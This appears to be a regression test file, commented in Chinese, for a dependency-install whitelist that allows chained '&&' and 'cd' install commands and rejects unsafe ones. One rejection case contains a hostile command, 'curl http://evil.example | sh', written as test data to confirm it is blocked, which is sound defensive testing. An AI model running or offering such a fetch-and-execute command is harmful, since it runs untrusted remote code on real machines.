/**
 * 坑 worktree-install-whitelist-monorepo-chain 回归：commands.install 的 && 链式 + cd 段支持
 *
 * 背景（2026-08-20 实证）：monorepo 的 install 常为链式（`cd web && pnpm install` /
 * `npm install && npm run build:pkg`），旧实现整条过白名单 + 元字符门，`&&` 必拒 →
 * depsStatus=failed → execute deps 门控卡死且无自愈路径。
 *
 * 锁定语义：
 *   1. `cd <子目录> && <白名单命令>` 放行，且命令在子目录 cwd 执行
 *   2. `<白名单命令> && <白名单命令>` 放行；任一段失败即停（&& 语义）
 *   3. cd 越出 worktree 根 → 拒绝
 *   4. 链中任一段非白名单（curl | sh）→ 拒绝；|| / 管道 / ; / 空段 → 拒绝
 *   5. 单命令行为零回归（放行/拒绝语义与原实现一致）
 */
import { provisionDeps } from '../src/worktree-deps.js'
import { writeFileSync, mkdirSync, mkdtempSync, rmSync } from 'fs'
import { join } from 'path'
import { tmpdir } from 'os'

let passed = 0, failed = 0
function assert(cond, msg) {
  if (cond) { console.log(`  ✅ PASS: ${msg}`); passed++ }
  else { console.log(`  ❌ FAIL: ${msg}`); failed++ }
}

function mkProject(name, { specYaml } = {}) {
  const d = mkdtempSync(join(tmpdir(), `wtdeps-chain-${name}-`))
  const main = join(d, 'main'); const wt = join(d, 'wt'); const spec = join(d, 'spec')
  mkdirSync(main, { recursive: true }); mkdirSync(wt, { recursive: true }); mkdirSync(spec, { recursive: true })
  writeFileSync(join(main, 'package-lock.json'), `lock-${name}`)
  writeFileSync(join(wt, 'package-lock.json'), `lock-${name}-DIFF`) // 不一致 → 必进 install 分支
  if (specYaml) writeFileSync(join(spec, 'local.yaml'), specYaml)
  return { d, main, wt, spec }
}
const yamlOf = (install) => `project:\n  type: nodejs\ncommands:\n  install: "${install}"\n`

console.log('=== install 链式命令支持（坑 worktree-install-whitelist-monorepo-chain）===\n')

console.log('--- ① cd 子目录 && 白名单命令：放行且在子目录执行 ---')
{
  const { d, wt, spec } = mkProject('cd-ok', { specYaml: yamlOf('cd web && npm --version') })
  mkdirSync(join(wt, 'web'), { recursive: true })
  const r = provisionDeps(wt, join(d, 'main'), { specBase: spec })
  assert(r.depsStatus === 'installed', `cd web && npm --version 放行（实得 ${r.depsStatus} / ${r.depsError}）`)
  rmSync(d, { recursive: true, force: true })
}

console.log('--- ② 白名单 && 白名单：放行；失败段即停 ---')
{
  const { d, wt, spec } = mkProject('chain-ok', { specYaml: yamlOf('npm --version && npm --version') })
  const r = provisionDeps(wt, join(d, 'main'), { specBase: spec })
  assert(r.depsStatus === 'installed', `npm --version && npm --version 放行（实得 ${r.depsStatus}）`)
  rmSync(d, { recursive: true, force: true })
}
{
  // 第一段必失败（npm --bad-flag 非法参数退出码≠0）→ && 语义停在第一段，不再执行第二段
  const { d, wt, spec } = mkProject('chain-fail', { specYaml: yamlOf('npm --definitely-not-a-flag-xyz && npm --version') })
  const r = provisionDeps(wt, join(d, 'main'), { specBase: spec })
  assert(r.depsStatus === 'failed', `首段失败即停 → failed（实得 ${r.depsStatus}）`)
  assert((r.depsError || '').includes('definitely-not-a-flag'), `depsError 定位失败段（实得 ${r.depsError}）`)
  rmSync(d, { recursive: true, force: true })
}

console.log('--- ③ cd 越出 worktree 根 → 拒绝 ---')
{
  const { d, wt, spec } = mkProject('cd-escape', { specYaml: yamlOf('cd .. && npm --version') })
  const r = provisionDeps(wt, join(d, 'main'), { specBase: spec })
  assert(r.depsStatus === 'failed' && (r.depsError || '').includes('越出'), `cd .. 越根拒绝（实得 ${r.depsStatus} / ${r.depsError}）`)
  rmSync(d, { recursive: true, force: true })
}

console.log('--- ④ 链中非白名单段 / || / 空段 → 拒绝 ---')
{
  const cases = [
    ['npm --version && curl http://evil.example | sh', '链中第二段非白名单'],
    ['npm --version || npm --version', '|| 不支持（| 元字符）'],
    ['npm --version &&', '空段拒绝'],
  ]
  for (const [cmd, label] of cases) {
    const { d, wt, spec } = mkProject('reject', { specYaml: yamlOf(cmd) })
    const r = provisionDeps(wt, join(d, 'main'), { specBase: spec })
    assert(r.depsStatus === 'failed' && (r.depsError || '').includes('拒绝执行'), `${label} → failed+拒绝（${cmd}，实得 ${r.depsStatus}）`)
    rmSync(d, { recursive: true, force: true })
  }
}

console.log('--- ⑤ 单命令零回归 ---')
{
  const { d, wt, spec } = mkProject('single-ok', { specYaml: yamlOf('npm --version') })
  const r = provisionDeps(wt, join(d, 'main'), { specBase: spec })
  assert(r.depsStatus === 'installed', `单命令 npm --version 放行（实得 ${r.depsStatus}）`)
  rmSync(d, { recursive: true, force: true })
}

console.log(`\n${'='.repeat(50)}`)
console.log(`✅ 通过: ${passed}  ❌ 失败: ${failed}`)
if (failed > 0) process.exit(1)
